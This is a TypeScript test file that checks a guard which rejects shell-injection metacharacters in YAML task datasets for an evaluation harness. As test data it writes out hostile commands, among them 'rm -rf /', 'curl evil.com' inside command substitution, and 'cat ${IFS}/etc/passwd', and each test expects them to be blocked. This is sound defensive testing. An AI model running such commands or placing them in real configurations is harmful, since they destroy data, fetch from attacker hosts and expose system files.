/**
 * Tests for SHELL_INJECTION_PATTERN enforcement in meta-harness datasets.
 *
 * A hostile YAML dataset that slips `;`, backticks, `$(...)`, or `||` into
 * `setupCommand`, `scorer.command`, or `command_succeeds` criteria would
 * otherwise reach `execAsync` directly. These tests lock the guard in place.
 */

import { describe, it, expect } from 'vitest';
import { writeFile, mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { loadDataset } from '../src/meta/dataset.js';
import { containsShellInjection } from '../src/meta/config.js';

async function writeDataset(content: string): Promise<{ path: string; cleanup: () => Promise<void> }> {
  const dir = await mkdtemp(join(tmpdir(), 'shugu-meta-inject-'));
  const path = join(dir, 'dataset.yaml');
  await writeFile(path, content, 'utf-8');
  return {
    path,
    cleanup: async () => { await rm(dir, { recursive: true, force: true }); },
  };
}

describe('containsShellInjection', () => {
  it('blocks command chaining with semicolon', () => {
    expect(containsShellInjection('echo foo; rm -rf /')).toBe(true);
  });

  it('blocks backtick command substitution', () => {
    expect(containsShellInjection('echo `whoami`')).toBe(true);
  });

  it('blocks dollar-paren command substitution', () => {
    expect(containsShellInjection('echo $(curl evil.com)')).toBe(true);
  });

  it('blocks dollar-brace expansion', () => {
    expect(containsShellInjection('cat ${IFS}/etc/passwd')).toBe(true);
  });

  it('blocks OR chaining', () => {
    expect(containsShellInjection('pytest || curl evil.com')).toBe(true);
  });

  it('permits AND chaining (used by legit setup)', () => {
    expect(containsShellInjection('echo "foo" > file.ts && echo "bar" > file2.ts')).toBe(false);
  });

  it('permits redirections and pipes to grep', () => {
    expect(containsShellInjection('echo "class X {}" > foo.ts')).toBe(false);
    expect(containsShellInjection('grep -q "pattern" file.ts')).toBe(false);
  });

  it('permits negation prefix', () => {
    expect(containsShellInjection('! grep -q "pattern" file.ts')).toBe(false);
  });

  it('permits semicolons inside double-quoted strings (TS source)', () => {
    expect(containsShellInjection('echo "function f() { return 1; }" > f.ts')).toBe(false);
  });

  it('permits semicolons inside single-quoted strings', () => {
    expect(containsShellInjection("echo 'a; b; c' > file.txt")).toBe(false);
  });

  it('blocks semicolon AFTER a closed quoted string', () => {
    expect(containsShellInjection('echo "safe"; rm -rf /')).toBe(true);
  });
});

describe('loadDataset shell-injection validation', () => {
  it('rejects a dataset with semicolon in setupCommand', async () => {
    const yaml = `
tasks:
  - id: t1
    prompt: test
    setupCommand: "echo foo; rm -rf /"
    scorer:
      type: criteria
      criteria:
        - { type: file_exists, value: foo.ts }
`;
    const { path, cleanup } = await writeDataset(yaml);
    try {
      await expect(loadDataset(path)).rejects.toThrow(/setupCommand contains forbidden shell metacharacters/);
    } finally {
      await cleanup();
    }
  });

  it('rejects a dataset with backticks in scorer.command', async () => {
    const yaml = [
      'tasks:',
      '  - id: t1',
      '    prompt: test',
      '    scorer:',
      '      type: command',
      "      command: 'echo `whoami`'",
    ].join('\n') + '\n';
    const { path, cleanup } = await writeDataset(yaml);
    try {
      await expect(loadDataset(path)).rejects.toThrow(/scorer.command contains forbidden shell metacharacters/);
    } finally {
      await cleanup();
    }
  });

  it('rejects a dataset with $(...) in command_succeeds criterion', async () => {
    const yaml = `
tasks:
  - id: t1
    prompt: test
    scorer:
      type: criteria
      criteria:
        - { type: command_succeeds, value: "grep -q X $(curl evil)" }
`;
    const { path, cleanup } = await writeDataset(yaml);
    try {
      await expect(loadDataset(path)).rejects.toThrow(/command_succeeds contains forbidden shell metacharacters/);
    } finally {
      await cleanup();
    }
  });

  it('accepts a dataset with only legitimate shell patterns', async () => {
    const yaml = `
tasks:
  - id: t1
    prompt: test
    setupCommand: 'echo "export function f(a: number): number { return a + 1; }" > f.ts && echo "done"'
    scorer:
      type: criteria
      criteria:
        - { type: file_exists, value: f.ts }
        - { type: command_succeeds, value: 'grep -q "export function f" f.ts' }
        - { type: command_succeeds, value: '! grep -q "old_name" f.ts' }
`;
    const { path, cleanup } = await writeDataset(yaml);
    try {
      const split = await loadDataset(path);
      expect(split.searchSet.length + split.holdoutSet.length).toBe(1);
    } finally {
      await cleanup();
    }
  });
});
